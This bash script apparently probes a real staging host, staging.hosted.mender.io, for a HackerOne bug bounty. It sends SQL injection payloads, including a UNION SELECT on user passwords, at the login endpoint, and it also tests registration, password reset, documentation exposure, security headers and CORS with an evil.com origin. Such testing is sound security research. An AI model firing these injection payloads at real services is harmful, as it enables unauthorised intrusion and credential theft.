#!/bin/bash
# Test unauthenticated endpoints - can run immediately

echo "=========================================="
echo "UNAUTHENTICATED TESTING"
echo "=========================================="
echo ""

H1_USER="test_researcher"

echo "[1] Testing login endpoint - SQL injection"
echo "-------------------------------------------"

# Test 1: Basic SQL injection
echo "Test: SQL injection in email field"
curl -s -X POST https://staging.hosted.mender.io/api/management/v1/useradm/auth/login \
  -H "Content-Type: application/json" \
  -H "X-HackerOne-Research: $H1_USER" \
  -d '{"email":"admin'\''--","password":"test"}' \
  -w "\nHTTP: %{http_code}\n" | head -20

echo ""
echo "Test: SQL injection - UNION attack"
curl -s -X POST https://staging.hosted.mender.io/api/management/v1/useradm/auth/login \
  -H "Content-Type: application/json" \
  -H "X-HackerOne-Research: $H1_USER" \
  -d '{"email":"admin@example.com'\'' UNION SELECT password FROM users--","password":"test"}' \
  -w "\nHTTP: %{http_code}\n" | head -20

echo ""
echo "[2] Testing registration endpoint"
echo "-------------------------------------------"

# Check if registration is open
echo "Test: Check registration endpoint"
curl -s -X POST https://staging.hosted.mender.io/api/management/v1/useradm/users \
  -H "Content-Type: application/json" \
  -H "X-HackerOne-Research: $H1_USER" \
  -d '{"email":"test@example.com","password":"test123"}' \
  -w "\nHTTP: %{http_code}\n" | head -20

echo ""
echo "[3] Testing password reset"
echo "-------------------------------------------"

echo "Test: Password reset endpoint"
curl -s -X POST https://staging.hosted.mender.io/api/management/v1/useradm/auth/password-reset/start \
  -H "Content-Type: application/json" \
  -H "X-HackerOne-Research: $H1_USER" \
  -d '{"email":"admin@example.com"}' \
  -w "\nHTTP: %{http_code}\n"

echo ""
echo "[4] Information disclosure"
echo "-------------------------------------------"

echo "Test: Try to access API documentation"
curl -s https://staging.hosted.mender.io/api/ \
  -H "X-HackerOne-Research: $H1_USER" \
  -w "\nHTTP: %{http_code}\n" | head -20

echo ""
echo "Test: Try to access /api/docs"
curl -s https://staging.hosted.mender.io/api/docs \
  -H "X-HackerOne-Research: $H1_USER" \
  -w "\nHTTP: %{http_code}\n" | head -20

echo ""
echo "Test: Try to access /api/swagger.json"
curl -s https://staging.hosted.mender.io/api/swagger.json \
  -H "X-HackerOne-Research: $H1_USER" \
  -w "\nHTTP: %{http_code}\n" | head -20

echo ""
echo "[5] Test security headers"
echo "-------------------------------------------"

echo "Checking security headers..."
curl -s -I https://staging.hosted.mender.io \
  -H "X-HackerOne-Research: $H1_USER" | grep -i -E "x-frame|x-content-type|strict-transport|content-security|x-xss"

echo ""
echo "[6] Test for version disclosure"
echo "-------------------------------------------"

curl -s -I https://staging.hosted.mender.io \
  -H "X-HackerOne-Research: $H1_USER" | grep -i "server:\|x-powered"

echo ""
echo "[7] Test CORS configuration"
echo "-------------------------------------------"

curl -s -H "Origin: https://evil.com" \
  -H "X-HackerOne-Research: $H1_USER" \
  -I https://staging.hosted.mender.io/api/management/v1/useradm/auth/login | grep -i "access-control"

echo ""
echo "=========================================="
echo "UNAUTHENTICATED TESTS COMPLETE"
echo "=========================================="
echo ""
echo "Review the responses above for:"
echo "- SQL injection responses"
echo "- Information disclosure"
echo "- Missing security headers"
echo "- Version disclosure"
echo "- CORS misconfigurations"
echo ""
